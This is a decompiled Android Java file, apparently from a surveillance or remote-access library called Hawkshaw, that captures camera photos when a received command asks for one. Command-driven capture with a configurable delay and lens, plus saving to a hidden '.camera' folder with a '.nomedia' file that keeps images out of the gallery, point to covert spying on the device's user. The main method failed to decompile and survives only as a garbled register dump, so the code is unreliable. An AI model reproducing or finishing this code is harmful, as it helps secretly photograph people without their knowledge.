package com.hawkshaw.library.features.media.camera;

import A.d;
import E.k;
import P0.b;
import W2.y;
import Y1.K;
import a3.e;
import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import androidx.lifecycle.C0266w;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.features.media.MediaService;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import i.C0523s;
import i.C0528x;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import t.C0952b;
import t3.N;
import t3.Y;

public final class TakePictureKt {
    private static final String FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS";
    private static final String PHOTO_EXTENSION = ".jpg";
    private static final String TAG = "CameraXPicture";

    private static final File getOutputFile(Context context, boolean z4) {
        File file;
        if (z4) {
            file = Environment.getExternalStoragePublicDirectory(".camera");
            File externalFilesDir = context.getExternalFilesDir(".camera");
            if (externalFilesDir != null) {
                file = externalFilesDir;
            }
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(file, ".nomedia");
            if (!file2.exists()) {
                file2.createNewFile();
            }
        } else {
            file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            if (!file.exists()) {
                file.mkdirs();
            }
        }
        return new File(file, C0528x.c(new SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(Long.valueOf(System.currentTimeMillis())), PHOTO_EXTENSION));
    }

    /* JADX WARNING: type inference failed for: r7v1, types: [q.O, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r11v1, types: [o.o, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r7v12, types: [m.e, java.lang.Object] */
    /* JADX WARNING: type inference failed for: r1v8, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x0064  */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x018c A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x018d  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0024  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object takePicture(android.content.Context r20, androidx.lifecycle.C0266w r21, com.hawkshaw.library.datalayer.models.Command.TakePictureRequest r22, A.d r23, a3.e r24) {
        /*
            r0 = r24
            boolean r1 = r0 instanceof com.hawkshaw.library.features.media.camera.g
            if (r1 == 0) goto L_0x0015
            r1 = r0
            com.hawkshaw.library.features.media.camera.g r1 = (com.hawkshaw.library.features.media.camera.g) r1
            int r2 = r1.f5006K
            r3 = -2147483648(0xffffffff80000000, float:-0.0)
            r4 = r2 & r3
            if (r4 == 0) goto L_0x0015
            int r2 = r2 - r3
            r1.f5006K = r2
            goto L_0x001a
        L_0x0015:
            com.hawkshaw.library.features.media.camera.g r1 = new com.hawkshaw.library.features.media.camera.g
            r1.<init>(r0)
        L_0x001a:
            java.lang.Object r0 = r1.f5005J
            b3.a r2 = b3.C0298a.f4140D
            int r3 = r1.f5006K
            r4 = 2
            r5 = 1
            if (r3 == 0) goto L_0x0064
            if (r3 == r5) goto L_0x0045
            if (r3 != r4) goto L_0x003d
            java.lang.Object r2 = r1.f5002G
            com.hawkshaw.library.features.media.camera.TakePictureKt$takePicture$imageSavedCallback$1 r2 = (com.hawkshaw.library.features.media.camera.TakePictureKt$takePicture$imageSavedCallback$1) r2
            java.lang.Object r3 = r1.f5001F
            o.J r3 = (o.C0755J) r3
            java.lang.Object r4 = r1.f5000E
            o.L r4 = (o.C0757L) r4
            java.lang.Object r1 = r1.f4999D
            java.util.concurrent.ExecutorService r1 = (java.util.concurrent.ExecutorService) r1
            Y1.C0110h.P(r0)
            goto L_0x0190
        L_0x003d:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0045:
            o.J r3 = r1.f5004I
            java.io.File r5 = r1.f5003H
            java.lang.Object r6 = r1.f5002G
            o.L r6 = (o.C0757L) r6
            java.lang.Object r7 = r1.f5001F
            java.util.concurrent.ExecutorService r7 = (java.util.concurrent.ExecutorService) r7
            java.lang.Object r8 = r1.f5000E
            A.d r8 = (A.d) r8
            java.lang.Object r9 = r1.f4999D
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest r9 = (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) r9
            Y1.C0110h.P(r0)
            r0 = r7
            r19 = r9
            r9 = r8
            r8 = r19
            goto L_0x016e
        L_0x0064:
            Y1.C0110h.P(r0)
            com.hawkshaw.library.logger.Logger r10 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r12 = "Take picture called"
            r13 = 0
            java.lang.String r11 = "CameraXPicture"
            r14 = 4
            r15 = 0
            com.hawkshaw.library.logger.Logger.d$default(r10, r11, r12, r13, r14, r15)
            java.util.concurrent.ExecutorService r0 = java.util.concurrent.Executors.newSingleThreadExecutor()
            java.util.LinkedHashSet r3 = new java.util.LinkedHashSet
            r3.<init>()
            int r6 = r22.getMLensFacing()
            q.O r7 = new q.O
            r7.<init>()
            r7.f8559a = r6
            r3.add(r7)
            o.o r11 = new o.o
            r11.<init>()
            r11.f8072a = r3
            o.s r3 = new o.s
            r3.<init>(r5)
            int r6 = r22.getMCaptureMode()
            q.c r7 = q.H.f8540E
            java.lang.Integer r6 = java.lang.Integer.valueOf(r6)
            q.Q r8 = r3.f8102b
            r8.l(r7, r6)
            int r6 = r22.getMFlashMode()
            q.c r7 = q.H.f8541F
            java.lang.Integer r6 = java.lang.Integer.valueOf(r6)
            r8.l(r7, r6)
            int r6 = r22.getMFlashType()
            q.c r7 = q.H.f8548M
            java.lang.Integer r6 = java.lang.Integer.valueOf(r6)
            r8.l(r7, r6)
            int r6 = r22.getJpegQuality()
            r7 = 100
            java.lang.String r9 = "jpegQuality"
            p3.q.G(r6, r5, r7, r9)
            q.c r7 = q.H.f8549N
            java.lang.Integer r6 = java.lang.Integer.valueOf(r6)
            r8.l(r7, r6)
            q.c r6 = q.j0.f8627t
            r8.l(r6, r11)
            android.util.Size r6 = new android.util.Size
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r7 = r22.getSize()
            int r7 = r7.getWidth()
            com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r9 = r22.getSize()
            int r9 = r9.getHeight()
            r6.<init>(r7, r9)
            q.c r7 = q.K.f8556l
            r8.l(r7, r6)
            int r6 = r22.getMAspectRatio()
            q.c r7 = q.K.f8552h
            java.lang.Integer r6 = java.lang.Integer.valueOf(r6)
            r8.l(r7, r6)
            java.lang.Integer r6 = r22.getMRotation()
            if (r6 == 0) goto L_0x0111
            java.lang.Integer r6 = r22.getMRotation()
            r6.getClass()
            q.c r7 = q.K.f8553i
            r8.l(r7, r6)
        L_0x0111:
            o.L r3 = r3.a()
            boolean r6 = r22.getSaveToPrivate()
            r7 = r20
            java.io.File r6 = getOutputFile(r7, r6)
            m.e r7 = new m.e
            r7.<init>()
            java.lang.Integer r8 = r11.c()
            if (r8 != 0) goto L_0x012b
            goto L_0x0133
        L_0x012b:
            int r8 = r8.intValue()
            if (r8 != 0) goto L_0x0133
            r8 = r5
            goto L_0x0134
        L_0x0133:
            r8 = 0
        L_0x0134:
            r7.f7724a = r8
            o.J r10 = new o.J
            r16 = 0
            r17 = 0
            r14 = 0
            r15 = 0
            r12 = r10
            r13 = r6
            r18 = r7
            r12.<init>(r13, r14, r15, r16, r17, r18)
            t3.q0 r7 = y3.t.f10013a
            com.hawkshaw.library.features.media.camera.h r14 = new com.hawkshaw.library.features.media.camera.h
            r13 = 0
            r8 = r14
            r9 = r23
            r15 = r10
            r10 = r21
            r12 = r3
            r8.<init>(r9, r10, r11, r12, r13)
            r8 = r22
            r1.f4999D = r8
            r1.f5000E = r9
            r1.f5001F = r0
            r1.f5002G = r3
            r1.f5003H = r6
            r1.f5004I = r15
            r1.f5006K = r5
            java.lang.Object r5 = X1.B.B(r7, r14, r1)
            if (r5 != r2) goto L_0x016b
            return r2
        L_0x016b:
            r5 = r6
            r6 = r3
            r3 = r15
        L_0x016e:
            com.hawkshaw.library.features.media.camera.TakePictureKt$takePicture$imageSavedCallback$1 r7 = new com.hawkshaw.library.features.media.camera.TakePictureKt$takePicture$imageSavedCallback$1
            r7.<init>(r5, r0, r9)
            long r8 = r8.getTakePictureDelay()
            r1.f4999D = r0
            r1.f5000E = r6
            r1.f5001F = r3
            r1.f5002G = r7
            r5 = 0
            r1.f5003H = r5
            r1.f5004I = r5
            r1.f5006K = r4
            java.lang.Object r1 = Y1.K.C(r8, r1)
            if (r1 != r2) goto L_0x018d
            return r2
        L_0x018d:
            r1 = r0
            r4 = r6
            r2 = r7
        L_0x0190:
            r4.F(r3, r1, r2)
            W2.y r0 = W2.y.f2418a
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.camera.TakePictureKt.takePicture(android.content.Context, androidx.lifecycle.w, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest, A.d, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    public static final void takePicture$lambda$0(b bVar, Context context, C0266w wVar, Command.TakePictureRequest takePictureRequest) {
        K.n(bVar, "$cameraProviderFuture");
        K.n(context, "$context");
        K.n(wVar, "$owner");
        K.n(takePictureRequest, "$request");
        CoroutineKt.safeLaunch(Y.f9306D, N.f9290a, new f(context, wVar, takePictureRequest, (d) bVar.get(), (e) null));
    }

    /* access modifiers changed from: private */
    public static final void takePicture$releaseResources(ExecutorService executorService, d dVar) {
        Logger.d$default(Logger.INSTANCE, TAG, "Releasing resources", false, 4, (Object) null);
        executorService.shutdown();
        new Handler(Looper.getMainLooper()).post(new a(dVar, 1));
        MediaService.Companion.stopService$library_release();
    }

    /* access modifiers changed from: private */
    public static final void takePicture$releaseResources$lambda$3(d dVar) {
        K.n(dVar, "$cameraProvider");
        dVar.c();
    }

    public static final Object takePicture(Context context, C0266w wVar, Command.TakePictureRequest takePictureRequest, e eVar) {
        C0952b b5 = d.b(context);
        b5.a(new C0523s(b5, context, wVar, takePictureRequest, 9), k.getMainExecutor(context));
        return y.f2418a;
    }
}
